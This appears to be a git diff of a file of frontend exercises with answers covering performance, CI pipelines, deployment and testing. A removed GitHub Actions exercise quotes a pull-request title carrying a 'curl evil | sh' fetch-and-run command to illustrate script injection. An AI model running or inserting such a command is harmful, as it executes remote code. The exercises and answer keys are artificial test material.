-              description: `Checks facade pattern. Write code that shows a fake chat button and loads the vendor script on first click.`,
-              answer: `Render a lightweight button; on click, create a script element with the vendor src, append it and open the widget when it loads. The page avoids hundreds of kB until a user actually wants chat.`,
+              task: `Load this script without blocking.`,
+              description: `Checks async third-party loading.`,
+              code: `<script src="https://tag.example.com/t.js"></script>`,
+              answer: `async stops it from blocking the parser.`,
+              solution: `<script src="https://tag.example.com/t.js" async></script>`,
             },
             {
-              task: `Measure how much each third party script costs.`,
-              description: `Checks measurement. Use DevTools Performance "Third-party" grouping or Lighthouse "Reduce the impact of third-party code" to report per-vendor main-thread time.`,
-              answer: `Lighthouse lists each third-party entity with transfer size and blocking time. Presenting that table with business value per tool lets stakeholders make an informed keep/remove decision.`,
+              task: `Name two questions for the marketing team.`,
+              description: `Checks governance of third-party scripts.`,
+              answer: `What business metric does each script serve, and who owns removing it? Then measure its cost before approval.`,
             },
           ],
         },
@@ -587,14 +656,23 @@ addEventListener('visibilitychange', () => {
 });`,
           exercises: [
             {
-              task: `Choose what percent of users to track.`,
-              description: `Checks cost/accuracy trade-off. 50M page views a month; justify a sample rate.`,
-              answer: `Even 1-5% gives hundreds of thousands of samples, enough for p75 by route and device. Sample per session, not per event, so a session's metrics stay together; raise the rate for low-traffic critical routes.`,
+              task: `Fix the metric sending on page close.`,
+              description: `Checks sendBeacon on visibilitychange.`,
+              code: `window.addEventListener('unload', () => {
+  fetch('/rum', { method: 'POST', body });
+});`,
+              answer: `unload is unreliable and fetch may be cancelled. Use visibilitychange and sendBeacon.`,
+              solution: `document.addEventListener('visibilitychange', () => {
+  if (document.visibilityState === 'hidden') navigator.sendBeacon('/rum', body);
+});`,
             },
             {
-              task: `Write a query for INP per page and per release.`,
-              description: `Checks analysis. Write pseudo-SQL computing p75 INP per route per release.`,
-              answer: `SELECT route, release, approx_percentile(value, 0.75) FROM rum WHERE name = 'INP' GROUP BY route, release. Comparing releases side by side reveals which deploy caused a regression.`,
+              task: `Spot the measurement bug.`,
+              description: `Checks Date.now for timing.`,
+              code: `const t = Date.now();
+render();
+console.log(Date.now() - t);`,
+              answer: `Date.now is coarse and can jump. Use performance.now() or performance.mark/measure.`,
             },
           ],
         },
@@ -615,14 +693,16 @@ Strong answer: explains ranges, repeatable builds and why CI must not change the
           follow: `What should you check when a pull request changes the lockfile a lot?`,
           exercises: [
             {
-              task: `CI passes on Monday and fails on Tuesday with no code change. What is a likely cause?`,
-              description: `Checks the role of the lockfile.`,
-              answer: `A dependency released a new version inside the allowed range and CI installed it because there was no lockfile or it used npm install. Commit the lockfile and use npm ci.`,
+              task: `Name the difference: npm ci vs npm install.`,
+              description: `Checks reproducible installs.`,
+              answer: `npm ci installs exactly from the lockfile and fails if it does not match package.json; npm install can change the lockfile.`,
             },
             {
-              task: `npm ci fails with "lockfile out of sync". What do you do?`,
-              description: `Checks the fix flow.`,
-              answer: `Run npm install locally to update the lockfile, check the diff, and commit both package.json and the lockfile together.`,
+              task: `Spot the problem.`,
+              description: `Checks ignoring the lockfile.`,
+              code: `# .gitignore
+package-lock.json`,
+              answer: `Without a committed lockfile, CI installs different versions each run. Commit it.`,
             },
           ],
         },
@@ -661,14 +741,25 @@ jobs:
       - run: npm run build`,
           exercises: [
             {
-              task: `A job fails because it cannot find package dot json. Why?`,
-              description: `Checks debugging. A job fails with "npm ERR! enoent package.json".`,
-              answer: `The repository was not checked out (missing actions/checkout) or the step runs in the wrong working-directory. Add checkout or set defaults.run.working-directory to the package folder.`,
+              task: `Fix the trigger.`,
+              description: `Checks pull_request events.`,
+              code: `on:
+  push:
+    branches: [main]`,
+              answer: `Add pull_request so checks run before merging.`,
+              solution: `on:
+  push:
+    branches: [main]
+  pull_request:`,
             },
             {
-              task: `Read the Node version from the nvmrc file.`,
-              description: `Checks single source of truth. Make setup-node read the version from .nvmrc.`,
-              answer: `Replace node-version with node-version-file: .nvmrc. Local development and CI then use the same Node version from one file, avoiding "works on my machine" mismatches.`,
+              task: `Use a current Node version.`,
+              description: `Checks setup-node config.`,
+              code: `- uses: actions/setup-node@v2
+  with: { node-version: 14 }`,
+              answer: `Node 14 is end of life. Use a current LTS and a newer action.`,
+              solution: `- uses: actions/setup-node@v4
+  with: { node-version: 22, cache: npm }`,
             },
           ],
         },
@@ -678,14 +769,19 @@ jobs:
           long: `Rebuilding per environment can produce different outputs (dependency updates, env vars, timing).\nWhat you tested in staging should be byte-identical to production.\nStore artifacts with a version/commit SHA (actions/upload-artifact, registry, S3).\nEnvironment-specific values come from runtime config (config.json, env injected at serve time), not build-time variables.\nVite's import.meta.env values are baked in at build time, which is why runtime config matters.\nRollback = redeploy a previous artifact.`,
           exercises: [
             {
-              task: `Pass the build folder from one job to another.`,
-              description: `Checks Actions artifacts. Write steps uploading dist in a build job and downloading it in a deploy job.`,
-              answer: `Use actions/upload-artifact@v4 with name: dist and path: dist in build, then needs: build and actions/download-artifact@v4 with name: dist in deploy. The deploy job ships exactly what was built and tested.`,
+              task: `Spot the problem.`,
+              description: `Checks rebuilding per environment.`,
+              code: `# staging job: npm run build && deploy
+# prod job: npm run build && deploy`,
+              answer: `Two builds can differ. Build once, save the artifact, and deploy the same files to both.`,
             },
             {
-              task: `Use a different API address in staging and production without a new build.`,
-              description: `Checks build-time vs runtime config.`,
-              answer: `Serve a /config.json (or inject window.__CONFIG__ in index.html) per environment and fetch it at startup. The JS bundle stays identical; only the small config file differs.`,
+              task: `Save the build as an artifact.`,
+              description: `Checks upload-artifact.`,
+              code: `# build job -> deploy-staging, deploy-prod`,
+              answer: `Upload once, then download in deploy jobs.`,
+              solution: `- uses: actions/upload-artifact@v4
+  with: { name: dist, path: dist }`,
             },
           ],
         },
@@ -697,20 +793,26 @@ jobs:
           long: `setup-node cache: npm caches ~/.npm keyed by lockfile.\nactions/cache for tool caches (Vite, Turbo, Playwright browsers).\nIndependent jobs (lint, typecheck, unit) run in parallel; E2E needs build.\nMatrix shards: Playwright --shard=1/4 across 4 runners.\nconcurrency with cancel-in-progress kills outdated runs on the same branch.\npaths / paths-ignore avoid running frontend CI for docs-only changes.\nMonorepos: Nx/Turborepo affected-only builds with remote cache.`,
           exercises: [
             {
-              task: `Split Playwright tests across four machines.`,
-              description: `Checks matrix. Write a job running Playwright in 4 shards.`,
-              answer: `Use strategy.matrix.shard: [1, 2, 3, 4] and run npx playwright test --shard=\${{ matrix.shard }}/4. Upload blob reports from each shard and merge them with npx playwright merge-reports in a final job.`,
+              task: `Write a matrix for two Node versions.`,
+              description: `Checks matrix builds.`,
+              answer: `The matrix runs the job once per version in parallel.`,
               solution: `strategy:
-  fail-fast: false
   matrix:
-    shard: [1, 2, 3, 4]
+    node: [20, 22]
 steps:
-  - run: npx playwright test --shard=\${{ matrix.shard }}/4`,
+  - uses: actions/setup-node@v4
+    with: { node-version: '\${{ matrix.node }}' }`,
             },
             {
-              task: `Cancel old runs when someone pushes a new commit.`,
-              description: `Checks concurrency. Add a block so new pushes cancel older runs of the same PR.`,
-              answer: `concurrency: group: ci-\${{ github.ref }}, cancel-in-progress: true. Only the newest commit's run continues, saving runner minutes and giving faster feedback.`,
+              task: `Run lint and test in parallel.`,
+              description: `Checks splitting jobs.`,
+              code: `jobs:
+  ci:
+    steps: [lint, test]`,
+              answer: `Separate jobs run at the same time.`,
+              solution: `jobs:
+  lint: { runs-on: ubuntu-latest, steps: [...] }
+  test: { runs-on: ubuntu-latest, steps: [...] }`,
             },
           ],
         },
@@ -743,14 +845,21 @@ jobs:
       - run: npm test`,
           exercises: [
             {
-              task: `Make it safe to print the pull request title.`,
-              description: `Checks safe interpolation. Fix: run: echo "\${{ github.event.pull_request.title }}".`,
-              answer: `A title like "; curl evil | sh" is executed by the shell. Put it in env: TITLE: \${{ github.event.pull_request.title }} and use "$TITLE" in the script, so it is treated as data.`,
+              task: `Spot the secret leak.`,
+              description: `Checks echoing secrets in logs.`,
+              code: `- run: echo "Token is \${{ secrets.NPM_TOKEN }}"`,
+              answer: `Do not print secrets. Pass them through env to the tool that needs them.`,
+              solution: `- run: npm publish
+  env:
+    NODE_AUTH_TOKEN: \${{ secrets.NPM_TOKEN }}`,
             },
             {
-              task: `Deploy to AWS without saved AWS keys.`,
-              description: `Checks keyless auth (OIDC). Describe deploying to S3 without stored keys.`,
-              answer: `Grant permissions: id-token: write, use aws-actions/configure-aws-credentials with role-to-assume. AWS trusts GitHub's OIDC token for that repo/branch and returns short-lived credentials, so no long-lived secret exists.`,
+              task: `Limit the workflow token rights.`,
+              description: `Checks least-privilege permissions.`,
+              code: `permissions: write-all`,
+              answer: `Give only what the job needs.`,
+              solution: `permissions:
+  contents: read`,
             },
           ],
         },
@@ -760,14 +869,14 @@ jobs:
           long: `Blue-green: deploy to idle environment, smoke test, flip router; rollback = flip back.\nCanary: 1% -> 10% -> 100% with automated checks on error rates and vitals.\nSPA specifics: hashed assets for both versions must coexist so open tabs don't 404 on chunks.\nRoute by cookie for stickiness so a user doesn't bounce between versions.\nTag errors and RUM with the release version to compare canary vs baseline.\nFeature flags offer finer-grained progressive delivery per feature.\nHandle chunk-load errors after deploys with a reload prompt.`,
           exercises: [
             {
-              task: `Handle missing code files after a new deploy.`,
-              description: `Checks deploy resilience. Write a handler for Vite's vite:preloadError event.`,
-              answer: `window.addEventListener('vite:preloadError', () => location.reload()) (optionally guard against loops with sessionStorage). Also keep old assets on the CDN for a while so most users never hit missing chunks.`,
+              task: `Name the difference: blue-green vs canary.`,
+              description: `Checks deployment strategies.`,
+              answer: `Blue-green switches all traffic at once to a ready copy; canary sends a small share first and grows it.`,
             },
             {
-              task: `Which numbers should stop a canary release?`,
-              description: `Checks automation. List metrics that should auto-abort a canary.`,
-              answer: `JS error rate vs baseline, API 5xx rate, p75 LCP/INP regression and key business conversion (e.g. form submit success). Breaching thresholds for N minutes triggers automatic rollback.`,
+              task: `Name an SPA issue during a switch.`,
+              description: `Checks old chunks after deploy.`,
+              answer: `Open tabs request old chunk files. Keep previous assets available, or reload on chunk load errors.`,
             },
           ],
         },
@@ -809,19 +918,23 @@ jobs:
           follow: `Why should deploy jobs on main usually not use cancel-in-progress?`,
           exercises: [
             {
-              task: `Split the end-to-end tests into four parallel parts.`,
-              description: `Checks matrix sharding.`,
-              answer: `Use a matrix with shard numbers and pass them to Playwright.`,
-              solution: `strategy:
-  matrix:
-    shard: [1, 2, 3, 4]
-steps:
-  - run: npx playwright test --shard=\${{ matrix.shard }}/4`,
+              task: `Cancel old runs on the same branch.`,
+              description: `Checks the concurrency key.`,
+              code: `# 5 pushes in a row start 5 e2e runs`,
+              answer: `A concurrency group with cancel-in-progress stops older runs.`,
+              solution: `concurrency:
+  group: e2e-\${{ github.ref }}
+  cancel-in-progress: true`,
             },
             {
-              task: `What happens to a deploy if a newer push cancels it halfway?`,
-              description: `Checks risk of cancelling deploys.`,
-              answer: `The deploy can stop in a half-done state, for example files uploaded but cache not cleared. For deploys use a concurrency group without cancel-in-progress so runs queue instead.`,
+              task: `Skip e2e for docs-only changes.`,
+              description: `Checks path filters.`,
+              code: `on:
+  pull_request:`,
+              answer: `paths-ignore skips the workflow when only docs change.`,
+              solution: `on:
+  pull_request:
+    paths-ignore: ['docs/**', '**/*.md']`,
             },
           ],
         },
@@ -832,14 +945,16 @@ steps:
           ai: true,
           exercises: [
             {
-              task: `Block pull requests that add unsafe packages.`,
-              description: `Checks PR gating. Add actions/dependency-review-action failing on high severity.`,
-              answer: `On pull_request add a step uses: actions/dependency-review-action@v4 with fail-on-severity: high. It diffs the lockfile and blocks PRs that introduce known-vulnerable or disallowed-license packages.`,
+              task: `Pin this action safely.`,
+              description: `Checks pinning actions to a SHA.`,
+              code: `- uses: some-org/deploy@main`,
+              answer: `A branch can change at any time. Pin to a full commit SHA.`,
+              solution: `- uses: some-org/deploy@3f1c2a9b8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c3b # v2.1.0`,
             },
             {
-              task: `Why is using an action by version tag risky? How do you fix it?`,
-              description: `Checks SHA pinning for uses: some/action@v2.`,
-              answer: `Tags are mutable; a compromised maintainer can repoint v2 to malicious code (as in the tj-actions incident in 2025). Pin to the full commit SHA with a comment of the version, and let Renovate update it.`,
+              task: `Name two dependency safety checks.`,
+              description: `Checks supply chain tooling.`,
+              answer: `npm audit or Dependabot alerts for known CVEs, and npm ci with a lockfile so installs cannot drift.`,
             },
           ],
         },
@@ -850,14 +965,16 @@ steps:
           ai: true,
           exercises: [
             {
-              task: `Plan how to rename one field in the API and the app.`,
-              description: `Checks expand-contract. Plan renaming applicantName to fullName across API and SPA.`,
-              answer: `Backend returns both fields; frontend reads fullName ?? applicantName; deploy frontend; monitor client versions; then stop returning applicantName and remove the fallback. Each step is independently deployable and reversible.`,
+              task: `Order these changes safely.`,
+              description: `Checks expand and contract.`,
+              code: `// Rename field name -> fullName`,
+              answer: `Backend adds fullName and keeps name; deploy frontend using fullName; then remove name later.`,
             },
             {
-              task: `How does the app know a new version is live?`,
-              description: `Checks version handling.`,
-              answer: `Poll /version.json (or read a header on API responses) and compare to the build's version; when different, show a "New version available, reload" banner. For breaking changes, the API can return 426 to force reload.`,
+              task: `Write tolerant client code during the change.`,
+              description: `Checks reading old and new fields.`,
+              answer: `Read the new field and fall back to the old one.`,
+              solution: `const fullName = dto.fullName ?? dto.name;`,
             },
           ],
         },
@@ -870,14 +987,15 @@ steps:
           ai: true,
           exercises: [
             {
-              task: `Call a shared workflow from an app workflow.`,
-              description: `Checks workflow_call. Show how an app workflow calls a shared one with inputs.`,
-              answer: `In the app: jobs: ci: uses: org/ci-templates/.github/workflows/frontend.yml@v3 with: app: admissions node: 22 secrets: inherit. The shared file declares on: workflow_call with inputs, keeping logic in one versioned place.`,
+              task: `Run tasks only for changed projects.`,
+              description: `Checks affected builds.`,
+              answer: `Nx or Turborepo run only what changed since main.`,
+              solution: `npx nx affected -t lint test build --base=origin/main`,
             },
             {
-              task: `Name four pipeline numbers you share every month.`,
-              description: `Checks measurement.`,
-              answer: `Median and p90 PR pipeline duration, flaky test rate, main branch red time, and deployment frequency/lead time per app. They show where platform investment pays off.`,
+              task: `Name a way to share build results.`,
+              description: `Checks remote caching.`,
+              answer: `Remote cache in Nx Cloud or Turborepo, so unchanged packages reuse earlier results.`,
             },
           ],
         },
@@ -888,14 +1006,17 @@ steps:
           ai: true,
           exercises: [
             {
-              task: `Check config files against a schema in CI.`,
-              description: `Checks schema validation. Add a step validating config/*.json against a JSON Schema with ajv-cli.`,
-              answer: `Run npx ajv-cli validate -s config.schema.json -d "config/*.json" in CI. Invalid types or missing required keys fail the PR instead of production.`,
+              task: `Spot the gap.`,
+              description: `Checks path filters hiding risky changes.`,
+              code: `on:
+  pull_request:
+    paths: ['src/**']`,
+              answer: `Config files outside src skip CI. Include config paths, or run a fast check on every change.`,
             },
             {
-              task: `Write three clear action items after the outage.`,
-              description: `Checks follow-through. Draft 3 SMART action items.`,
-              answer: `Enforce branch protection on config repo by Friday (owner: platform); add schema validation job within 2 weeks (owner: team A); add config change alert to the incident channel this sprint (owner: SRE). Each has an owner and date.`,
+              task: `Name a blameless follow-up step.`,
+              description: `Checks postmortem culture.`,
+              answer: `Write a blameless postmortem focused on the process gap, then add an automatic check instead of a manual rule.`,
             },
           ],
         },
@@ -943,14 +1064,21 @@ jobs:
           GH_TOKEN: \${{ github.token }}`,
           exercises: [
             {
-              task: `Design a one click rollback.`,
-              description: `Checks reversibility for this setup.`,
-              answer: `Add a workflow_dispatch workflow taking a release tag, rebuilding or downloading that release's artifact and re-uploading its index.html (assets are still present). Because assets are immutable and retained, rollback takes seconds.`,
+              task: `Require approval before production deploy.`,
+              description: `Checks GitHub environments.`,
+              code: `jobs:
+  deploy:
+    runs-on: ubuntu-latest`,
+              answer: `An environment with required reviewers pauses for approval.`,
+              solution: `jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    environment: production`,
             },
             {
-              task: `Show which release caused each error in Sentry.`,
-              description: `Checks observability.`,
-              answer: `Inject the release version at build time, set it in Sentry.init({ release }), upload source maps for that release and create a deploy record from CI. Sentry then shows "first seen in release X" and suspect commits.`,
+              task: `Name how to make rollback fast.`,
+              description: `Checks redeploying known artifacts.`,
+              answer: `Keep versioned artifacts tagged by commit, and redeploy the previous one with one command.`,
             },
           ],
         },
@@ -965,19 +1093,20 @@ jobs:
           long: `Arrange: create inputs and mocks.\nAct: call the function or trigger the event once.\nAssert: check the observable result, not internal details.\nName tests by behavior: "returns 0 for empty cart".\nNo shared mutable state between tests; each can run alone and in any order.\nDeterministic: control time and randomness.\nFailing message should explain what broke.`,
           exercises: [
             {
-              task: `Write a Vitest test for a sum function.`,
-              description: `Checks AAA. Test sum(items) returning total price; run npx vitest run.`,
-              answer: `Arrange an array of items with prices, act by calling sum, and assert with expect(result).toBe(30). Add a second test for an empty array returning 0 to cover the edge case.`,
-              solution: `import { test, expect } from 'vitest';
-test('sums item prices', () => {
-  const items = [{ price: 10 }, { price: 20 }];
-  expect(sum(items)).toBe(30);
-});`,
+              task: `Label the Arrange, Act, Assert parts.`,
+              description: `Checks the AAA pattern.`,
+              code: `const cart = new Cart();
+cart.add({ price: 5 });
+expect(cart.total).toBe(5);`,
+              answer: `Line 1 arranges, line 2 acts, line 3 asserts. One act per test keeps it clear.`,
             },
             {
-              task: `Give these tests better names.`,
-              description: `Checks clarity. Rename tests called "test1", "works", "handles error".`,
-              answer: `Use behavior-focused names like "formats date as YYYY-MM-DD", "returns empty list when API responds 404", "throws ValidationError for negative quantity". A failing test name should tell you the broken requirement.`,
+              task: `Spot the problem.`,
+              description: `Checks testing many behaviors at once.`,
+              code: `test('cart', () => {
+  // tests add, remove, discount, tax, checkout
+});`,
+              answer: `One test checks five behaviors, so a failure is unclear. Write one test per behavior with a clear name.`,
             },
           ],
         },
@@ -996,14 +1125,23 @@ test('sums item prices', () => {
 });`,
           exercises: [
             {
-              task: `Test that a function throws an error for a bad id.`,
-              description: `Checks async error assertions. Write a test that fetchUser(-1) rejects with "Invalid id".`,
-              answer: `Use await expect(fetchUser(-1)).rejects.toThrow('Invalid id'). Forgetting await here has the same false-positive problem as the original test.`,
+              task: `Spot why this test always passes.`,
+              description: `Checks missing assertion awaiting.`,
+              code: `test('saves', () => {
+  save().then(r => expect(r.ok).toBe(true));
+});`,
+              answer: `The test ends before the promise, so failures are ignored. Return or await it.`,
+              solution: `test('saves', async () => {
+  expect((await save()).ok).toBe(true);
+});`,
             },
             {
-              task: `Which lint rule finds this mistake?`,
-              description: `Checks tooling. Run npm run lint.`,
-              answer: `@typescript-eslint/no-floating-promises (type-aware) flags the unhandled promise, and vitest/valid-expect flags async expectations not awaited. Enabling them prevents this class of fake-green test.`,
+              task: `Spot the problem.`,
+              description: `Checks tests without assertions.`,
+              code: `test('formats', () => {
+  format('2026-01-01');
+});`,
+              answer: `No assertion, so it passes unless it throws. Assert the result.`,
             },
           ],
         },
@@ -1013,14 +1151,16 @@ test('sums item prices', () => {
           long: `Types: statement, line, branch, function coverage; branch is most useful.\nVitest: vitest run --coverage with the v8 provider.\nCoverage shows untested code, which is valuable for finding gaps.\nIt cannot show missing requirements or weak assertions.\nChasing 100% encourages testing trivial code and implementation details.\nMutation testing (Stryker) measures whether tests detect changes.`,
           exercises: [
             {
-              task: `Create a coverage report and read it.`,
-              description: `Checks tooling. Run npx vitest run --coverage and open coverage/index.html.`,
-              answer: `The report shows per-file percentages and highlights uncovered lines and branches in red/yellow. The candidate should pick an uncovered branch (e.g. an error path) and add a test for it.`,
+              task: `Predict coverage and spot the gap.`,
+              description: `Checks coverage without real checks.`,
+              code: `const div = (a, b) => a / b;
+test('div', () => { div(4, 2); });`,
+              answer: `100% line coverage, but nothing is asserted and division by zero is not tested.`,
             },
             {
-              task: `Write a test with full coverage that checks nothing.`,
-              description: `Checks critical thinking.`,
-              answer: `Calling the function with inputs that hit every branch without any expect gives 100% coverage and zero protection. This shows why assertion quality and behavior focus matter more than the number.`,
+              task: `Name a better signal than line coverage.`,
+              description: `Checks test quality metrics.`,
+              answer: `Mutation testing, like Stryker, shows whether tests fail when the code is broken.`,
             },
           ],
         },
@@ -1046,14 +1186,21 @@ test('shows toast then hides it', () => {
 });`,
           exercises: [
             {
-              task: `Make user event work with fake timers.`,
-              description: `Checks integration of tools. Configure userEvent to work with vi fake timers.`,
-              answer: `Create the user with userEvent.setup({ advanceTimers: vi.advanceTimersByTime }). Otherwise userEvent's internal delays wait on timers that never advance and the test hangs.`,
+              task: `Fix the assertion.`,
+              description: `Checks asserting behavior not classes.`,
+              code: `expect(btn).toHaveClass('btn--disabled');`,
+              answer: `Check what users get: a disabled button.`,
+              solution: `expect(screen.getByRole('button', { name: 'Save' })).toBeDisabled();`,
             },
             {
-              task: `Choose the best query for three elements.`,
-              description: `Checks query priority. Pick queries for a submit button, an email input with a label and an error message.`,
-              answer: `getByRole('button', { name: /submit/i }), getByLabelText(/email/i) or getByRole('textbox', { name: /email/i }), and getByRole('alert') or getByText for the error. These mirror how users and assistive tech find elements.`,
+              task: `Replace the real wait with fake timers.`,
+              description: `Checks vi.useFakeTimers.`,
+              code: `await new Promise(r => setTimeout(r, 3000));
+expect(toast).not.toBeVisible();`,
+              answer: `Fake timers make the test instant and stable.`,
+              solution: `vi.useFakeTimers();
+act(() => vi.advanceTimersByTime(3000));
+expect(toast).not.toBeVisible();`,
             },
           ],
         },
@@ -1063,19 +1210,22 @@ test('shows toast then hides it', () => {
           long: `Mocking fetch couples tests to how the code calls fetch (axios vs fetch, URL building).\nMSW handlers: http.get('/api/users', () => HttpResponse.json([...])).\nsetupServer in Node for Vitest; setupWorker in the browser.\nOverride per test with server.use() for errors and edge cases.\nonUnhandledRequest: 'error' catches missing mocks.\nResetHandlers after each test to keep tests isolated.\nHandlers can be generated from OpenAPI to stay in sync with the contract.`,
           exercises: [
             {
-              task: `Set up MSW in Vitest with one handler.`,
-              description: `Checks setup. Write the setup file and one handler; run npx vitest.`,
-              answer: `Create server = setupServer(...handlers) and in setup file call beforeAll(() => server.listen({ onUnhandledRequest: 'error' })), afterEach(() => server.resetHandlers()), afterAll(() => server.close()). Tests then render components normally.`,
-              solution: `import { setupServer } from 'msw/node';
-import { http, HttpResponse } from 'msw';
-export const server = setupServer(
-  http.get('/api/users', () => HttpResponse.json([{ id: 1, name: 'Ann' }])),
-);`,
+              task: `Write an MSW handler.`,
+              description: `Checks MSW v2 syntax.`,
+              code: `// Mock GET /api/user -> { name: 'Ann' }`,
+              answer: `http.get with HttpResponse.json mocks the endpoint at the network level.`,
+              solution: `import { http, HttpResponse } from 'msw';
+export const handlers = [
+  http.get('/api/user', () => HttpResponse.json({ name: 'Ann' })),
+];`,
             },
             {
-              task: `Test what the page shows when the server returns an error.`,
-              description: `Checks per-test overrides. Make /api/users return 500 in one test and assert the error UI.`,
-              answer: `Inside the test call server.use(http.get('/api/users', () => new HttpResponse(null, { status: 500 }))), render, then await screen.findByRole('alert'). resetHandlers restores the default for other tests.`,
+              task: `Override a handler for an error test.`,
+              description: `Checks server.use per test.`,
+              answer: `server.use adds a handler just for this test.`,
+              solution: `server.use(
+  http.get('/api/user', () => new HttpResponse(null, { status: 500 })),
+);`,
             },
           ],
         },
@@ -1085,19 +1235,16 @@ export const server = setupServer(
           long: `Component: const results = await axe(container); expect(results).toHaveNoViolations().\nE2E: new AxeBuilder({ page }).withTags(['wcag2a','wcag2aa','wcag22aa']).analyze().\nScan each state (modal open, errors shown), not only initial load.\nCatches: missing labels, contrast, invalid ARIA, missing alt.\nMisses: logical focus order, whether alt text is meaningful, keyboard traps in custom widgets, announcements timing.\nAdd keyboard-only Playwright tests for critical flows.\nPeriodic manual audits with NVDA/VoiceOver.`,
           exercises: [
             {
-              task: `Scan the login page with axe in Playwright.`,
-              description: `Checks E2E a11y for WCAG 2.2 AA; run npx playwright test.`,
-              answer: `Import AxeBuilder from '@axe-core/playwright', navigate, run analyze with WCAG tags and expect(results.violations).toEqual([]). Attach results to the report for debugging failures.`,
-              solution: `test('login is accessible', async ({ page }) => {
-  await page.goto('/login');
-  const r = await new AxeBuilder({ page }).withTags(['wcag2a', 'wcag2aa', 'wcag22aa']).analyze();
-  expect(r.violations).toEqual([]);
-});`,
+              task: `Add an axe check to a component test.`,
+              description: `Checks jest-axe or vitest-axe.`,
+              code: `const { container } = render(<Form />);`,
+              answer: `Run axe on the rendered DOM and expect no violations.`,
+              solution: `expect(await axe(container)).toHaveNoViolations();`,
             },
             {
-              task: `Test a dialog with only the keyboard.`,
-              description: `Checks what axe misses. Write steps to verify a modal traps focus and returns it on close.`,
-              answer: `Focus the opener, press Enter, assert focus is inside the dialog, press Tab repeatedly and assert it stays inside, press Escape and assert focus returns to the opener. axe cannot verify this behavior.`,
+              task: `Name two issues axe cannot find.`,
+              description: `Checks limits of automated a11y.`,
+              answer: `Whether alt text is meaningful and whether focus order makes sense. These need manual keyboard and screen reader checks.`,
             },
           ],
         },
@@ -1126,14 +1273,20 @@ export const server = setupServer(
 });`,
           exercises: [
             {
-              task: `Make the flaky failure happen on purpose.`,
-              description: `Checks debugging technique. Run npx playwright test --repeat-each=20 --workers=4 on the original test.`,
-              answer: `Repetition and parallel workers expose timing and data races; the original fails intermittently. The fixed test passes all runs. Opening the trace viewer for failures shows exactly where timing diverged.`,
+              task: `Fix the flaky wait.`,
+              description: `Checks Playwright auto-waiting assertions.`,
+              code: `await page.waitForTimeout(2000);
+expect(await page.locator('.toast').isVisible()).toBe(true);`,
+              answer: `Fixed sleeps race. Use a web-first assertion that retries.`,
+              solution: `await expect(page.getByRole('status')).toBeVisible();`,
             },
             {
-              task: `Log in once and reuse the session in all tests.`,
-              description: `Checks setup projects and storageState.`,
-              answer: `Create auth.setup.ts that logs in and calls page.context().storageState({ path: '.auth/user.json' }); in config add a setup project and make others depend on it with use.storageState. Tests skip the UI login, becoming faster and less flaky.`,
+              task: `Spot the flaky part.`,
+              description: `Checks shared test data.`,
+              code: `test('rename', async ({ page }) => {
+  // edits the same 'Test User' as other tests
+});`,
+              answer: `Tests running in parallel change the same record. Create unique data per test.`,
             },
           ],
         },
@@ -1144,14 +1297,19 @@ export const server = setupServer(
           ai: true,
           exercises: [
             {
-              task: `Write a stable screenshot test for a page with a clock and an avatar.`,
-              description: `Checks stabilization in Playwright.`,
-              answer: `Install page.clock.setFixedTime, mock API data, then expect(page).toHaveScreenshot('dashboard.png', { mask: [page.getByTestId('avatar')], animations: 'disabled', maxDiffPixelRatio: 0.01 }). Run in the Playwright Docker image to match CI.`,
+              task: `Reduce screenshot noise.`,
+              description: `Checks masking dynamic content.`,
+              code: `await expect(page).toHaveScreenshot();`,
+              answer: `Mask changing areas and disable animations.`,
+              solution: `await expect(page).toHaveScreenshot({
+  mask: [page.getByTestId('clock')],
+  animations: 'disabled',
+});`,
             },
             {
-              task: `How do you update the saved screenshots after a design change?`,
-              description: `Checks workflow.`,
-              answer: `Run npx playwright test --update-snapshots in the same Docker image (or a CI job that commits them), and review the image diffs in the PR. Never update baselines locally on macOS for Linux CI.`,
+              task: `Name why screenshots differ between machines.`,
+              description: `Checks rendering environment drift.`,
+              answer: `Different fonts, OS, and GPU rendering. Run visual tests in one Docker image.`,
             },
           ],
         },
@@ -1162,14 +1320,18 @@ export const server = setupServer(
           ai: true,
           exercises: [
             {
-              task: `Compare two sort functions with Vitest bench.`,
-              description: `Checks Vitest bench; run npx vitest bench.`,
-              answer: `Use bench('native sort', () => ...) and bench('custom', () => ...) inside describe. The output shows ops/sec and relative margin; treat small differences within margin of error as noise.`,
+              task: `Name a stable metric for perf tests.`,
+              description: `Checks noise-resistant metrics.`,
+              answer: `Total blocking time or bundle size are more stable than LCP in CI. Track trends, not single runs.`,
             },
             {
-              task: `Measure how long filtering takes in Playwright.`,
-              description: `Checks runtime perf testing. Measure time from clicking Filter to results rendered.`,
-              answer: `Call performance.mark in the app around the operation (or evaluate in page), click, wait for results, then read performance.measure via page.evaluate. Run several times and assert the median stays under a budget.`,
+              task: `Write a simple timing check.`,
+              description: `Checks performance.measure.`,
+              answer: `Measure between marks and assert a loose limit.`,
+              solution: `performance.mark('s');
+renderTable(rows);
+const m = performance.measure('t', 's');
+expect(m.duration).toBeLessThan(200);`,
             },
           ],
         },
@@ -1182,14 +1344,15 @@ export const server = setupServer(
           ai: true,
           exercises: [
             {
-              task: `Write a test plan for importing applicants from a CSV file.`,
-              description: `Checks decision-making. Allocate tests per level.`,
-              answer: `Unit: CSV parsing/validation edge cases. Integration: upload component with MSW showing per-row errors and progress. E2E: one happy path upload and one with errors. Plus a11y scan of the error table and a contract test for the import endpoint.`,
+              task: `Pick the test level for each check.`,
+              description: `Checks choosing test levels.`,
+              code: `// a) date helper  b) form validation UI  c) login to checkout flow`,
+              answer: `a) unit, b) integration with Testing Library, c) one e2e test for the critical path.`,
             },
             {
-              task: `A senior developer says tests slow them down. What do you say?`,
-              description: `Checks leadership. Respond in 4 sentences.`,
-              answer: `Acknowledge the cost and look at data: which tests are slow or brittle? Remove low-value tests and invest in fast integration tests. Show escaped bugs that tests would have caught. Agree on a lightweight minimum rather than mandating coverage numbers.`,
+              task: `Name a way to make the team follow it.`,
+              description: `Checks lightweight enforcement.`,
+              answer: `Add a test plan section to the PR template and check it in review.`,
             },
           ],
         },
@@ -1222,14 +1385,23 @@ export default defineConfig({
 });`,
           exercises: [
             {
-              task: `Find which tests pass only after a retry.`,
-              description: `Checks reporting across runs.`,
-              answer: `Playwright marks them "flaky" in reports; export JSON reporter results to a dashboard (or use a test analytics service) and rank by flaky count. Assign owners for the top offenders each sprint.`,
+              task: `Fix this config for CI.`,
+              description: `Checks retries and traces in CI.`,
+              code: `export default defineConfig({
+  retries: 0,
+  use: { trace: 'on' },
